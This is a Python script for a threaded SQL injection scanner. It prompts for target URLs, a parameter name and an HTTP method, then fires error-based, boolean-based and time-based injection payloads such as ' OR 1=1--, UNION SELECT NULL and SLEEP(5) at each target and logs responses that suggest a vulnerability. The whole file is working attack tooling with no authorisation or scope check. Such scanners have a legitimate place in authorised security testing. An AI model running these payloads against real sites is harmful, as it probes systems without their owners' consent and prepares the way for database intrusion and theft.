import requests
import time
import threading
from datetime import datetime

results = []
lock = threading.Lock()

payloads = {
    "error": ["'", "\"", "'--", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "\" OR \"\"=\""],
    "boolean": ["1 AND 1=1", "1 AND 1=2", "' OR 'a'='a", "' OR 'a'='b"],
    "time": ["1; WAITFOR DELAY '00:00:05'--", "1 AND SLEEP(5)", "'; SELECT pg_sleep(5)--"]
}

error_signatures = ["sql syntax", "unclosed quotation", "you have an error", "ODBC", "MySQL", "Warning", "unterminated"]

def send_sqli(url, param, method, mode, ptype, payload):
    data = {param: payload}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        start = time.time()
        if method == "GET":
            resp = requests.get(url, params=data, headers=headers, timeout=10)
        else:
            resp = requests.post(url, data=data, headers=headers, timeout=10)
        end = time.time()

        response_time = round(end - start, 2)
        body = resp.text.lower()
        status = resp.status_code

        reason = ""
        if ptype == "error":
            if any(sig in body for sig in error_signatures):
                reason = "SQL Error Signature Detected"
        elif ptype == "boolean":
            if payload in ["1 AND 1=1", "' OR 'a'='a"] and "true" in body:
                reason = "Boolean Logic True Detected"
            elif payload in ["1 AND 1=2", "' OR 'a'='b"] and "false" in body:
                reason = "Boolean Logic False Detected"
        elif ptype == "time":
            if response_time >= 4.5:
                reason = f"Response delay suggests time-based injection ({response_time}s)"

        if reason:
            with lock:
                results.append({
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "type": ptype,
                    "reason": reason,
                    "status": status,
                    "time": response_time,
                    "timestamp": datetime.utcnow().isoformat()
                })
                print(f"[!] {url} with {ptype} payload: {reason}")
    except Exception as e:
        with lock:
            results.append({
                "url": url,
                "param": param,
                "payload": payload,
                "type": ptype,
                "reason": "Exception: " + str(e),
                "timestamp": datetime.utcnow().isoformat()
            })
        print(f"[!] Error on {url} with payload {payload}: {e}")

def run_sqli_tester():
    print("\n--- SQL Injection Tester ---")
    urls = input("Enter comma-separated target URLs: ").strip().split(",")
    urls = [u.strip() for u in urls if u]

    param = input("Enter parameter name to test (e.g., id): ").strip()
    method = input("HTTP method [GET/POST]: ").strip().upper()
    mode = input("Mode [passive/active]: ").strip().lower()

    types_to_test = ["error"] if mode == "passive" else ["error", "boolean", "time"]
    threads = []

    for url in urls:
        for ptype in types_to_test:
            for payload in payloads[ptype]:
                t = threading.Thread(target=send_sqli, args=(url, param, method, mode, ptype, payload))
                t.start()
                threads.append(t)

    for t in threads:
        t.join()

    with open("sqli_results.txt", "w") as f:
        for r in results:
            f.write(str(r) + "\n")

    print("\n[+] Scan complete. Results saved to sqli_results.txt.")

